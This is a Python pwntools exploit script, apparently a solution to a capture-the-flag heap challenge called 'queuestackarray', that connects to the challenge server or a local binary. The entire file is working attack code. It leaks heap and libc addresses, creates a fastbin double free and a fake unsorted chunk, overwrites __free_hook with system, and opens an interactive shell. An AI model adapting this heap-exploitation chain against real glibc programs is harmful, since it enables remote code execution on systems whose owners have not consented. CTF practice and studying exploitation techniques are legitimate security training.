from pwn import *
import sys

libc = ELF("./libc.so.6")
elf = ELF("./queuestackarray")

if sys.argv[1] == "r":
    p = remote("queuestackarray.hsctf.com", 1337)
else:
    p = process("./queuestackarray_patched")
    # context.terminal = ["tmux", "splitw", "-h"]
    # gdb.attach(p, """
    # continue
    # heap bins
    # """)

def pushleft(num, content):
    p.sendlineafter("> ", "pushleft" + str(num) + " " + content)

def push(num, content):
    p.sendlineafter("> ", "push" + str(num) + " " + content)

def pop(num):
    p.sendlineafter("> ", "pop" + str(num))

def popright(num):
    p.sendlineafter("> ", "popright" + str(num))

def examine(num, idx):
    p.sendlineafter("> ", "examine" + str(num) + str(idx))

def solve():
    for i in range(6):
        push(3, str(i)*0x10)
    push(4, str(4)*0x10)

    for i in range(6):
        push(1, str(i)*0x10)
    
    for i in range(4):
        pushleft(2, str(i)*0x10)

    for i in range(6):
        pop(3)
    pop(4)

    # heap leak
    examine(3, 2)
    heap_leak = u64(p.recv(6) + "\x00\x00") - 0x3a0
    fake_unsorted = heap_leak + 0x590
    success("heap_leak: %s"%hex(heap_leak))
    

    # now tcache 0x20 is full, try to get double free in fastbin 0x20
    popright(2)
    for i in range(4):
        pop(1)
    pop(2)

    # assume we have a perfect fast bin (bruteforce required): victim -> another chunk -> victim (loop detected)
    # drain all chunk in tcache 0x20
    for i in range(6):
        push(3, str(i)*0x10)
    push(4, str(4)*0x10)

    # since tcache 0x20 is empty, if we allocate a chunk in fastbin, the rest will be taken to tcache 
    # allocate victim and overwrite to wanted address
    push(1, p64((fake_unsorted) | 0x69000000000000)) # because the last char will be replaced wil null byte => need a garbage value
    for i in range(6):
        pop(3)

    # put chunks 0x60 to craft a fake unsorted bin
    for i in range(6):
        push(3, "B" * 0x48)
    for i in range(3):
        push(4, "C" * 0x48)
    for i in range(4):
        push(2, "A" * 0x48)

    # put all in tcache 0x60
    for i in range(6):
        pop(3)
    for i in range(3):
        pop(4)

    # overwrite size of fake unsorted bin
    for i in range(3):
        pushleft(2, "A"*0x10)

    pushleft(3, "A"*0x10)
    pushleft(3, "A"*0x8 + p64(0x4a1 | 0x690000))

    popright(3)

    # leak libc
    p.sendlineafter("> ", "examine36")
    libc.address = u64(p.recv(6) + "\x00\x00") - 0x1ecbe0
    system = libc.symbols["system"]
    binsh = next(libc.search("/bin/sh"))
    freehook = libc.symbols["__free_hook"]
    success("libc: %s"%hex(libc.address))
    success("system: %s"%hex(system))
    success("freehook: %s"%hex(freehook))

    # now unsorted bin is overlap with tcache 0x60 chunks
    push(4, "a"*0x40)
    # pause()
    push(4, "b"*0x30 + p64((freehook - 0x42)| 0x69000000000000))

    # pause()
    for i in range(6):
        push(4, "A"*0x48)

    push(2, "A"*0x48)
    push(2, "A"*0x42 + p32(system & 0xffffffff) + p16(system >> 32))

    # from now just create a chunk (push 1/bin/sh) and free it several times (pop1) until pop shell

    p.interactive()

if __name__ == "__main__":
    solve()
